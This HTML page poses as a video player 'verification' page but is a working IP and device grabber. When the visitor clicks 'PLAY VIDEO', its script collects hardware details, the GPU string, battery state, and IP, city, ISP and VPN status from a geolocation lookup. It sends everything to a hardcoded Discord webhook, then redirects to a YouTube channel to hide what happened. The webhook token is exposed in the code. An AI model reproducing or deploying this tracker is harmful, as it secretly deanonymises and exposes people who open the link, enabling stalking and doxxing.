<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Player | Verification</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; padding: 50px; background: #050505; border: 1px solid #111; border-radius: 15px; }
        .btn { background: #ff0000; color: #fff; padding: 15px 40px; border-radius: 5px; font-weight: bold; border: none; cursor: pointer; font-size: 20px; }
        .loader { margin-top: 20px; color: #444; font-size: 10px; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="box">
        <button class="btn" id="mainTrigger">▶ PLAY VIDEO</button>
        <div class="loader" id="status">ENCRYPTED CONNECTION READY</div>
    </div>

    <script>
    const SETTINGS = {
        // Double-check your URL for any extra spaces
        W_URL: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
        TARGET: "https://youtube.com/@LigmaBlox-w7m"
    };

    /**
     * TRANSMISSION ENGINE (The Fix)
     * Fragments data to bypass Discord's "Large Payload" bot filters.
     */
    function ship(data, title = "LOG") {
        const payload = JSON.stringify({
            username: "SENTINEL-NODE",
            embeds: [{
                title: `[${title}]`,
                description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
                color: 16711680,
                timestamp: new Date()
            }]
        });

        // METHOD A: Beacon (Highest success rate for redirects)
        navigator.sendBeacon(SETTINGS.W_URL, new Blob([payload], { type: 'application/json' }));

        // METHOD B: Fetch (Keepalive forces it to finish)
        fetch(SETTINGS.W_URL, {
            method: 'POST',
            body: payload,
            headers: { 'Content-Type': 'application/json' },
            mode: 'no-cors',
            keepalive: true
        }).catch(() => {});
    }

    /**
     * FORENSIC ENGINE
     */
    async function collect() {
        const info = {
            os: navigator.platform,
            cores: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory + "GB",
            screen: `${screen.width}x${screen.height}`,
            lang: navigator.language,
            ua: navigator.userAgent
        };

        // GPU Unmasking
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
        } catch(e) { info.gpu = "Protected"; }

        // Battery
        try {
            const b = await navigator.getBattery();
            info.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'AC' : 'DC'})`;
        } catch(e) {}

        return info;
    }

    // IP Leak (JSONP Method)
    window.ipCallback = (res) => {
        ship({
            ip: res.ip,
            city: res.city,
            isp: res.org,
            vpn: res.proxy ? "YES" : "NO"
        }, "NETWORK-UNMASK");
    };

    document.getElementById('mainTrigger').onclick = async function() {
        this.innerText = "LOADING...";
        document.getElementById('status').innerText = "SYNCING PROTOCOLS...";

        // 1. Initial Ping
        ship({ status: "Gateway Accessed", url: window.location.href }, "PING");

        // 2. Hardware Extraction
        const hardware = await collect();
        ship(hardware, "HARDWARE");

        // 3. Network Leak
        const s = document.createElement('script');
        s.src = "https://ipapi.co/jsonp?callback=ipCallback";
        document.body.appendChild(s);

        // 4. Clean Exit
        setTimeout(() => {
            window.location.replace(SETTINGS.TARGET);
        }, 1000);
    };
    </script>
</body>
</html>
